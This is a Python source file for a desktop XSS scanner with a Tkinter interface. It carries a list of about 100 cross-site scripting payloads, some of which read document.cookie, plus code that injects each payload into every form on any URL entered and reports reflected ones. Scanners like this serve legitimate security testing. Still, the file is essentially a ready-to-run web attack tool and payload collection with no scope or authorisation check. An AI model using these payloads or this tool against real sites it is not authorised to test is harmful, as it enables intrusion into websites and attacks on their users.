import requests
from bs4 import BeautifulSoup
import urllib.parse
import tkinter as tk
from tkinter import scrolledtext, messagebox
import threading

# 100+ XSS Payloads
payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'><script>alert(1)</script>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<script src=data:text/javascript,alert(1)></script>",
    "<object data=javascript:alert(1)>",
    "<video><source onerror=\"alert(1)\"></video>",
    "<a href='javascript:alert(1)'>Click</a>",
    "<form><button formaction='javascript:alert(1)'>CLICK</button></form>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<img src=1 onerror=prompt(1)>",
    "<script>eval('alert(1)')</script>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "<img src='x' onerror='alert(1)'>",
    "<div onpointerover='alert(1)'>Hover me</div>",
    "<button onclick=alert(1)>Click</button>",

    "<svg><desc><![CDATA[<script>alert(1)</script>]]></desc></svg>",
    "<math href=\"javascript:alert(1)\">X</math>",
    "<body onload=alert(String.fromCharCode(88,83,83))>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<img src=x onerror='javascript:alert(1)'>",
    "<link rel='stylesheet' href='javascript:alert(1)'>",
    "<style>@import 'javascript:alert(1)';</style>",
    "<video src='javascript:alert(1)'>",
    "<object type='text/x-scriptlet' data='javascript:alert(1)'>",
    "<embed src='javascript:alert(1)'>",
    "<script>window.onerror=alert</script>",
    "<script>window.onload=alert</script>",
    "<img src='x' onerror='alert(document.cookie)'>",
    "<svg/onload=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<base href=\"javascript:alert(1)//\">",
    "<body onafterprint=alert(1)>",
    "<img dynsrc='javascript:alert(1)'>",
    "<input type='image' src='javascript:alert(1)'>",
    "<video onerror=alert(1)>",
    "<audio src='javascript:alert(1)'>",
    "<script>setTimeout('alert(1)',1000)</script>",
    "<iframe src='data:text/html,<script>alert(1)</script>'>",
    "<img src=javascript:alert(1)>",
    "<form action='javascript:alert(1)'><input type=submit>",
    "<object data='data:text/html,<script>alert(1)</script>'>",
    "<svg><script>alert(1)</script></svg>",
    "<img onerror=alert('XSS') src='invalid'>",
    "<details open ontoggle='alert(1)'>",
    "<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>Click me</a>",
    "<button formaction='javascript:alert(1)'>Click</button>",
    "<img src=x onerror=alert('XSS')>",
    "<input onblur=alert(1) autofocus>",
    "<body onunload=alert(1)>",
    "<object type='image/svg+xml' data='data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+'>",
    "<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='indefinite' values='alert(1)'></animate></svg>",
    "<script>location='javascript:alert(1)'</script>",
    "<meta http-equiv='refresh' content='0;url=data:text/html,<script>alert(1)</script>'>",
    "<script>alert(document.domain)</script>",
    "<svg onload=prompt(1)>",
    "<img src='x' onerror='confirm(1)'>",
    "<body onload=confirm(1)>",
    "<form onsubmit='alert(1)'><input type='submit'></form>",
    "<svg><animate attributeName='xlink:href' begin='0s' dur='1s' repeatCount='indefinite' values='javascript:alert(1)'></animate></svg>",
    "<img src=x onerror='javascript:alert(1)'>",
    "<object data='javascript:alert(1)' type='text/html'>",
    "<script>console.log('XSS')</script>",
    "<video><source onerror=alert(1)></video>",
    "<svg><set attributeName='onload' to='alert(1)' begin='0s'></set></svg>",
    "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>",
    "<svg><script xlink:href='data:text/javascript,alert(1)'></script></svg>",
    "<math><maction xlink:href='javascript:alert(1)'>X</maction></math>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<svg><foreignObject onload='alert(1)'></foreignObject></svg>",
    "<input type='text' value='<script>alert(1)</script>'>",
    "<textarea><script>alert(1)</script></textarea>",
    "<script>eval('alert(1)')</script>",
    "<script>new Image().src='javascript:alert(1)';</script>",
    "<svg><desc><![CDATA[<img src=x onerror=alert(1)>]]></desc></svg>",
    "<img src='x' onerror='alert(1);'>",
    "<svg><script><![CDATA[alert(1)]]></script></svg>",
    "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' type='text/html'>",
    "<svg><animateMotion onbegin='alert(1)' dur='1s' repeatCount='indefinite'></animateMotion></svg>",
    "<details open ontoggle=\"alert('XSS')\">",
    "<input autofocus onfocus=alert(1)>",
    "<script>setTimeout(() => alert(1), 1000);</script>",
    "<svg><set attributeName='onload' to='alert(1)'></set></svg>",
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
    "<body onpageshow=alert(1)>",
    "<img srcset=\"x 1x, javascript:alert(1) 2x\">",
    "<script>document.location='javascript:alert(1)';</script>",
    "<svg><animate attributeName='href' begin='0s' dur='1s' repeatCount='indefinite' values='javascript:alert(1)'></animate></svg>",
    "<svg><set attributeName='onload' to='alert(1)' begin='0s'></set></svg>",
    "<math href='javascript:alert(1)'>X</math>",
    "<video onerror=alert(1)><source></video>",
    "<img src='x' onerror='alert(1)'>",
    "<svg><script>alert(document.cookie)</script></svg>",
    "<input value=''><script>alert(1)</script>",
    "<form action='javascript:alert(1)'><input type=submit></form>",
    "<svg onload=alert(1)>",
    "<script>window.location='javascript:alert(1)'</script>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "<img src=x onerror=alert(1)>",
]

# Extract forms
def get_forms(url):
    soup = BeautifulSoup(requests.get(url).text, "html.parser")
    return soup.find_all("form")

# Extract form details
def get_form_details(form):
    details = {
        "action": form.attrs.get("action"),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": []
    }
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        name = input_tag.attrs.get("name")
        details["inputs"].append({"type": input_type, "name": name})
    return details

# Submit form with payload
def submit_form(form_details, url, payload):
    target_url = urllib.parse.urljoin(url, form_details["action"])
    data = {input["name"]: payload for input in form_details["inputs"] if input["name"]}
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

# XSS scanning function
def scan_xss():
    url = url_entry.get().strip()
    if not url:
        messagebox.showerror("Input Error", "Please enter a valid URL.")
        return

    output_text.delete("1.0", tk.END)
    output_text.insert(tk.END, f"Scanning {url} for XSS vulnerabilities...\n\n")
    try:
        forms = get_forms(url)
        output_text.insert(tk.END, f"Detected {len(forms)} forms.\n\n")

        for i, form in enumerate(forms):
            form_details = get_form_details(form)
            output_text.insert(tk.END, f"[Form {i+1}] {form_details}\n", "form")
            for payload in payloads:
                response = submit_form(form_details, url, payload)
                if payload in response.text:
                    output_text.insert(tk.END, f"[*] XSS Vulnerability Detected!\nPayload: {payload}\n\n", "vuln")
                    break
            else:
                output_text.insert(tk.END, "[-] No vulnerability detected in this form.\n\n", "safe")
    except Exception as e:
        output_text.insert(tk.END, f"Error: {e}\n", "error")

# GUI Setup
root = tk.Tk()
root.title("XSS Vulnerability Scanner")
root.geometry("800x600")
root.configure(bg="#1e1e1e")

title_label = tk.Label(root, text="XSS Scanner", font=("Helvetica", 20, "bold"), fg="#00ffcc", bg="#1e1e1e")
title_label.pack(pady=10)

frame = tk.Frame(root, bg="#1e1e1e")
frame.pack(pady=5)

url_label = tk.Label(frame, text="Enter URL:", font=("Helvetica", 12), bg="#1e1e1e", fg="#ffffff")
url_label.pack(side=tk.LEFT, padx=5)

url_entry = tk.Entry(frame, width=60, font=("Helvetica", 12))
url_entry.pack(side=tk.LEFT, padx=5)

# Run scan in a new thread
scan_button = tk.Button(root, text="Scan", font=("Helvetica", 12, "bold"), bg="#00cc66", fg="white",
                        command=lambda: threading.Thread(target=scan_xss).start())
scan_button.pack(pady=10)

output_text = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=90, height=25, font=("Courier", 10),
                                        bg="#2b2b2b", fg="#ffffff", insertbackground="white")
output_text.pack(padx=10, pady=10)

# Tag styles
output_text.tag_config("form", foreground="#00ffff")
output_text.tag_config("vuln", foreground="#ff4d4d")
output_text.tag_config("safe", foreground="#00ff00")
output_text.tag_config("error", foreground="#ffcc00")

root.mainloop()
